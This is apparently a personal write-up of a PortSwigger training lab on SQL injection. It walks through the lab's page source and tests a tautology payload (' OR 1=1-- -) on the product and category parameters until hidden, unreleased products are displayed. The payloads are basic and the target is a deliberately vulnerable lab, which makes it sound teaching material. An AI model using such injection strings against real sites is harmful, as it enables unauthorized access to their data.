---
title: "sqli 1 - portswigger labs"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "web-exploitation", "sqli-1", "portswigger-labs", "siunam321"]
summary: "web writeup for \"sqli 1\" from portswigger labs - techniques: sqli, web-exploitation, sqli-1, portswigger-labs, siunam321."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-1/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/SQL-Injection/sqli-1/README.md"
ctf:
  name: "portswigger labs"
  challenge: "sqli 1"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** sqli 1
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-1/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/SQL-Injection/sqli-1/README.md>

---
# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Dec 3, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data), you'll learn: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032350.png)

**View-source:**
```html
<div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/resources/images/shop.svg">
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a href="/">All</a>
                        <a href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/filter?category=Gifts">Gifts</a>
                        <a href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/filter?category=Lifestyle">Lifestyle</a>
                        <a href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/filter?category=Pets">Pets</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/resources/images/rating3.png">
                            $58.56
                            <a class="button" href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/resources/images/rating2.png">
                            $90.82
                            <a class="button" href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/resources/images/rating2.png">
                            $11.66
                            <a class="button" href="https://raw.githubusercontent.com/siunam321/siunam321.github.io/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/product?productId=19">View details</a>
                        </div>
                        [...]
```

As you can see, **there is a `filter` page that accepts `category` GET parameter, and a `product` page that accepts `productId` GET parameter.**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032838.png)

Hmm... What if I clicked one of the `View details` buttons?

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032910.png)

**It brings me to the `product` page with the `productId` GET parameter value `9`.**

What if I change the `9` to `1`?

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033024.png)

Hmm... Nothing weird.

**How about testing it for it is vulnerable to SQL injection?**

**Imagine this is the SQL statement of the `productId`:**
```sql
SELECT * FROM products WHERE productId = '1'
```

**What if I close that string with `'`, then returns always true via `OR 1=1`, then commented out the rest of the SQL statement?**

**Payload:**
```sql
/product?productId=1' OR 1=1-- -
```

**New SQL statement:**
```sql
SELECT * FROM products WHERE productId = '1' OR 1=1-- -
```

Will it returns every products?

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033129.png)

Hmm... Nope. It requires a valid product ID.

**How about the `filter` page?**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033640.png)

**Let's click the `Pets` filter!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033708.png)

**Now the GET parameter value will be: `Pets`**

**Also, let's go back to the SQL statement that the lab gave us:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Hmm... Again, what if I let it returns always true via the `OR` clause?**  

**Payload:**
```sql
/filter?category=' OR 1=1-- -
```

**New SQL statement:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1-- - AND released = 1
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203034318.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203034331.png)

**Now we can see there are some unreleased items!!**

# Conclusion

What we've learned:

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
